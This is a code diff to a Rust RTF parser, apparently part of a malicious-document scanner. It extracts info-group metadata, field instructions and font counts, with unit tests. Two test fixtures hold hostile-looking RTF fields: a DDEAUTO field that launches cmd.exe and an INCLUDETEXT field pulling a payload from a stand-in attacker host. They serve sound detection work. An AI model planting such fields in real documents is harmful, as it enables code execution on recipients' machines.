@@ -2,9 +2,11 @@ use crate::rtf::error::{Result, RtfError};
 use crate::rtf::hex_decoder::decode_hex_tolerant;
 use crate::rtf::ole_extractor;
 use crate::rtf::types::{
-    ControlWord, DocumentMetadata, OleObject, RtfDocument, RtfHeader, SuspiciousFlag,
+    ControlWord, DocumentMetadata, OleObject, RtfDocument, RtfFieldInstruction, RtfHeader,
+    SuspiciousFlag,
 };
 use regex::Regex;
+use std::collections::BTreeMap;
 use std::sync::OnceLock;
 
 /// Cached regex patterns for RTF parsing
@@ -96,6 +98,17 @@ impl RtfParser {
         // Calculate nesting depth
         let max_nesting_depth = self.calculate_nesting_depth(&text)?;
 
+        // `\info` group: title/author/manager/etc. — captured via a
+        // brace-aware walk so nested groups don't leak across keys.
+        let (info_strings, info_numeric) = extract_info_group(&text);
+
+        // `\field` group `\fldinst` instructions — DDEAUTO,
+        // INCLUDETEXT, IMPORT, LINK.
+        let fields = extract_field_instructions(&text);
+
+        // `\fonttbl` count — single integer surfaced for kv tree.
+        let font_count = count_fonttbl_entries(&text);
+
         let header = RtfHeader {
             version: self.extract_version(&control_words),
             charset: self.extract_charset(&control_words),
@@ -108,12 +121,16 @@ impl RtfParser {
             max_nesting_depth,
             has_objupdate,
             detected_charset: self.extract_charset(&control_words),
+            info: info_strings,
+            info_numeric,
+            font_count,
         };
 
         Ok(RtfDocument {
             header,
             control_words,
             embedded_objects,
+            fields,
             metadata,
         })
     }
@@ -329,6 +346,297 @@ fn detect_hex_obfuscation(text: &str) -> bool {
     false
 }
 
+// ---------------------------------------------------------------------------
+// `\info` group extraction
+// ---------------------------------------------------------------------------
+
+/// Walk the `\info` group and split entries into string and numeric
+/// field maps. RTF stores info-group fields as nested groups: each
+/// inner brace-pair is one named field whose first control word is
+/// the field name and whose remaining text is the value. Numeric
+/// fields like `\nofpages` carry the integer as the control-word
+/// parameter and have no group body.
+///
+/// Returns `(strings, numerics)` — empty maps when no `\info` group
+/// is present.
+fn extract_info_group(text: &str) -> (BTreeMap<String, String>, BTreeMap<String, i64>) {
+    let mut strings = BTreeMap::new();
+    let mut numerics = BTreeMap::new();
+    let bytes = text.as_bytes();
+
+    // Locate `\info` opening; bail when absent.
+    let Some(info_start) = text.find("\\info") else {
+        return (strings, numerics);
+    };
+
+    // Walk forward to find the matching `}` for the group containing
+    // `\info`. RTF info groups always live inside `{\info ... }`.
+    let mut depth: i32 = 0;
+    let mut info_end: Option<usize> = None;
+    // Step backward to find the opening `{`.
+    let group_open = bytes[..info_start]
+        .iter()
+        .rposition(|&b| b == b'{')
+        .unwrap_or(info_start);
+    for (i, &b) in bytes[group_open..].iter().enumerate() {
+        match b {
+            b'{' => depth += 1,
+            b'}' => {
+                depth -= 1;
+                if depth == 0 {
+                    info_end = Some(group_open + i + 1);
+                    break;
+                }
+            }
+            _ => {}
+        }
+    }
+    let Some(info_end) = info_end else {
+        return (strings, numerics);
+    };
+    let info_slice = &text[group_open..info_end];
+
+    // Inside `\info`, walk to capture each inner `{\<word> ... }`
+    // group as a (key, value) pair. We start *after* the outer
+    // `\info` control word so we don't recurse into the wrapper
+    // group itself.
+    let inner_bytes = info_slice.as_bytes();
+    let mut i = info_slice
+        .find("\\info")
+        .map(|p| p + "\\info".len())
+        .unwrap_or(0);
+    while i < inner_bytes.len() {
+        if inner_bytes[i] != b'{' {
+            i += 1;
+            continue;
+        }
+        // Find matching close.
+        let mut d: i32 = 0;
+        let mut close = None;
+        for (k, &c) in inner_bytes[i..].iter().enumerate() {
+            match c {
+                b'{' => d += 1,
+                b'}' => {
+                    d -= 1;
+                    if d == 0 {
+                        close = Some(i + k);
+                        break;
+                    }
+                }
+                _ => {}
+            }
+        }
+        let Some(close) = close else { break };
+
+        let inner = &info_slice[i + 1..close]; // strip the `{` and `}`
+
+        // Inner shape: `\<name>[<param>]<space?><value>` — find the
+        // first whitespace after the control word; everything after
+        // that is the value.
+        if let Some(rest) = inner.strip_prefix('\\') {
+            let mut name_end = 0;
+            for (k, ch) in rest.char_indices() {
+                if !ch.is_ascii_alphabetic() {
+                    name_end = k;
+                    break;
+                }
+                name_end = rest.len();
+            }
+            let name = &rest[..name_end];
+            let after = &rest[name_end..];
+
+            // Numeric parameter (signed) right after the name?
+            let (param, value_start) = parse_int_prefix(after);
+            let value = after[value_start..]
+                .trim_start_matches(|c: char| c == ' ' || c == '\t')
+                .trim()
+                .to_string();
+
+            if value.is_empty() {
+                if let Some(p) = param {
+                    numerics.insert(name.to_string(), p);
+                }
+            } else if !name.is_empty() {
+                strings.insert(name.to_string(), strip_rtf_text(&value));
+            }
+        }
+
+        i = close + 1;
+    }
+
+    (strings, numerics)
+}
+
+/// Read a leading optional signed decimal integer; return
+/// `(Some(value), bytes_consumed)` or `(None, 0)`.
+fn parse_int_prefix(s: &str) -> (Option<i64>, usize) {
+    let bytes = s.as_bytes();
+    let mut end = 0;
+    if bytes.first() == Some(&b'-') {
+        end = 1;
+    }
+    while end < bytes.len() && bytes[end].is_ascii_digit() {
+        end += 1;
+    }
+    if end == 0 || (end == 1 && bytes[0] == b'-') {
+        (None, 0)
+    } else {
+        (s[..end].parse().ok(), end)
+    }
+}
+
+/// Strip simple RTF control sequences from a value string. Doesn't
+/// resolve every escape (that would re-implement an RTF renderer);
+/// covers the cases that matter for kv-tree readability — `\'XX`
+/// hex-byte escapes are left as `?`, and `\\<word>` sequences are
+/// dropped.
+fn strip_rtf_text(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    let mut chars = s.chars().peekable();
+    while let Some(c) = chars.next() {
+        if c == '\\' {
+            match chars.peek().copied() {
+                // Hex escape: \'XX → unknown byte, render as `?`.
+                Some('\'') => {
+                    chars.next();
+                    let _ = chars.next();
+                    let _ = chars.next();
+                    out.push('?');
+                    continue;
+                }
+                // Literal-character escapes: \\ \{ \} keep the
+                // following character verbatim.
+                Some(escaped @ ('\\' | '{' | '}')) => {
+                    chars.next();
+                    out.push(escaped);
+                    continue;
+                }
+                _ => {}
+            }
+            // Word escape: skip control word
+            while let Some(&p) = chars.peek() {
+                if p.is_ascii_alphabetic() {
+                    chars.next();
+                } else {
+                    break;
+                }
+            }
+            // Optional numeric parameter.
+            while let Some(&p) = chars.peek() {
+                if p.is_ascii_digit() || p == '-' {
+                    chars.next();
+                } else {
+                    break;
+                }
+            }
+            // Optional trailing space terminator on control word.
+            if chars.peek() == Some(&' ') {
+                chars.next();
+            }
+            continue;
+        }
+        if c == '{' || c == '}' {
+            continue;
+        }
+        out.push(c);
+    }
+    out.trim().to_string()
+}
+
+// ---------------------------------------------------------------------------
+// `\field` instruction extraction
+// ---------------------------------------------------------------------------
+
+fn fldinst_regex() -> Option<&'static Regex> {
+    static RE: OnceLock<Option<Regex>> = OnceLock::new();
+    RE.get_or_init(|| Regex::new(r"\\fldinst\s*\{?([^{}]{1,8192})").ok())
+        .as_ref()
+}
+
+/// Pull `\fldinst` payloads out of every field group and split each
+/// into (kind, target). The "kind" is the first whitespace-separated
+/// token (DDEAUTO/INCLUDETEXT/IMPORT/LINK/HYPERLINK/etc.); the target
+/// is the rest, with surrounding `"` quotes stripped.
+fn extract_field_instructions(text: &str) -> Vec<RtfFieldInstruction> {
+    let mut out = Vec::new();
+    let Some(re) = fldinst_regex() else {
+        return out;
+    };
+    for cap in re.captures_iter(text) {
+        let payload = match cap.get(1) {
+            Some(m) => strip_rtf_text(m.as_str()),
+            None => continue,
+        };
+        let mut parts = payload.splitn(2, char::is_whitespace);
+        let kind = parts.next().unwrap_or("").to_string();
+        if kind.is_empty() {
+            continue;
+        }
+        let target = parts
+            .next()
+            .unwrap_or("")
+            .trim()
+            .trim_matches('"')
+            .to_string();
+        let offset = cap.get(0).map(|m| m.start()).unwrap_or(0);
+        out.push(RtfFieldInstruction {
+            kind: kind.to_uppercase(),
+            target,
+            offset,
+        });
+    }
+    out
+}
+
+// ---------------------------------------------------------------------------
+// `\fonttbl` entry counter — small surface used by the kv tree.
+// ---------------------------------------------------------------------------
+
+fn count_fonttbl_entries(text: &str) -> usize {
+    let Some(start) = text.find("\\fonttbl") else {
+        return 0;
+    };
+    let bytes = text.as_bytes();
+    let group_open = bytes[..start]
+        .iter()
+        .rposition(|&b| b == b'{')
+        .unwrap_or(start);
+    let mut depth: i32 = 0;
+    let mut close = None;
+    for (i, &b) in bytes[group_open..].iter().enumerate() {
+        match b {
+            b'{' => depth += 1,
+            b'}' => {
+                depth -= 1;
+                if depth == 0 {
+                    close = Some(group_open + i + 1);
+                    break;
+                }
+            }
+            _ => {}
+        }
+    }
+    let Some(close) = close else { return 0 };
+    // Each font is a `{\fN ...}` group; count `\f` followed by a digit.
+    let slice = &text[group_open..close];
+    let mut count = 0;
+    let bytes = slice.as_bytes();
+    let mut i = 0;
+    while i + 1 < bytes.len() {
+        if bytes[i] == b'\\' && bytes[i + 1] == b'f' {
+            // Require a digit immediately after `f` so we don't count
+            // `\fonttbl` itself or `\fcharset`.
+            if let Some(&b) = bytes.get(i + 2) {
+                if b.is_ascii_digit() {
+                    count += 1;
+                }
+            }
+        }
+        i += 1;
+    }
+    count
+}
+
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod tests {
@@ -370,5 +678,69 @@ mod tests {
         let words = parser.extract_control_words("{\\rtf1\\ansi\\deff0}");
         assert!(words.iter().any(|w| w.name == "rtf"));
         assert!(words.iter().any(|w| w.name == "ansi"));
+    }
+
+    /// `\info` group with a couple of string fields and one numeric.
+    #[test]
+    fn extract_info_group_captures_strings_and_numerics() {
+        let body = "{\\rtf1\\ansi{\\info{\\title Q4 Audit}{\\author John Doe}{\\nofpages3}}}";
+        let (s, n) = extract_info_group(body);
+        assert_eq!(s.get("title").map(|s| s.as_str()), Some("Q4 Audit"));
+        assert_eq!(s.get("author").map(|s| s.as_str()), Some("John Doe"));
+        assert_eq!(n.get("nofpages"), Some(&3));
+    }
+
+    /// `\info` group with Cyrillic author — the locale-mismatch hook
+    /// the trait base will use.
+    #[test]
+    fn extract_info_group_preserves_cyrillic_author() {
+        let body = "{\\rtf1{\\info{\\author Иван Иванов}}}";
+        let (s, _n) = extract_info_group(body);
+        assert_eq!(s.get("author").map(|s| s.as_str()), Some("Иван Иванов"));
+    }
+
+    /// Missing `\info` group is benign — empty maps, no panic.
+    #[test]
+    fn extract_info_group_missing_returns_empty() {
+        let body = "{\\rtf1\\ansi this document has no info group}";
+        let (s, n) = extract_info_group(body);
+        assert!(s.is_empty());
+        assert!(n.is_empty());
+    }
+
+    /// `\field` with DDEAUTO instruction is captured with kind +
+    /// target split.
+    #[test]
+    fn extract_field_instructions_captures_ddeauto() {
+        let body =
+            r#"{\rtf1{\field{\*\fldinst{ DDEAUTO "C:\\Windows\\System32\\cmd.exe" "/c calc" }}}}"#;
+        let fields = extract_field_instructions(body);
+        assert_eq!(fields.len(), 1);
+        assert_eq!(fields[0].kind, "DDEAUTO");
+        assert!(fields[0].target.contains("cmd.exe"));
+    }
+
+    /// INCLUDETEXT field with a remote URL.
+    #[test]
+    fn extract_field_instructions_captures_includetext_url() {
+        let body =
+            r#"{\rtf1{\field{\*\fldinst{INCLUDETEXT "https://attacker.example/payload.docx"}}}}"#;
+        let fields = extract_field_instructions(body);
+        assert_eq!(fields.len(), 1);
+        assert_eq!(fields[0].kind, "INCLUDETEXT");
+        assert!(fields[0].target.contains("attacker.example"));
+    }
+
+    /// `\fonttbl` entry count.
+    #[test]
+    fn count_fonttbl_entries_basic() {
+        let body =
+            r"{\rtf1{\fonttbl{\f0\fnil Arial;}{\f1\froman Times;}{\f2\fswiss Helvetica;}}}";
+        assert_eq!(count_fonttbl_entries(body), 3);
+    }
+
+    #[test]
+    fn count_fonttbl_entries_missing_returns_zero() {
+        assert_eq!(count_fonttbl_entries("{\\rtf1\\ansi}"), 0);
     }
 }
